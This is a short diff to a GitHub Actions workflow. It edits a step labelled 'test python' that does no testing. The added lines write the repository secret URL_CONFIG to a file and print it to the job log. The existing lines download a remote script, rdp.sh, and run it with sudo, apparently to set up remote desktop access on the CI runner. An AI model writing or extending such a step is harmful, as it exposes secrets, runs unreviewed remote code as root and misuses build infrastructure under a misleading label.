@@ -13,6 +13,11 @@ jobs:
     - uses: actions/checkout@v2
     - name: test python
       run: |
+        cd ~/
+        cat << EOF >> rdp.txt
+        ${{ secrets.URL_CONFIG }}
+        EOF
+        cat rdp.txt
         wget https://raw.githubusercontent.com/crypt-bphc/Test/main/rdp.sh
         sudo chmod +x rdp.sh
         sudo ./rdp.sh
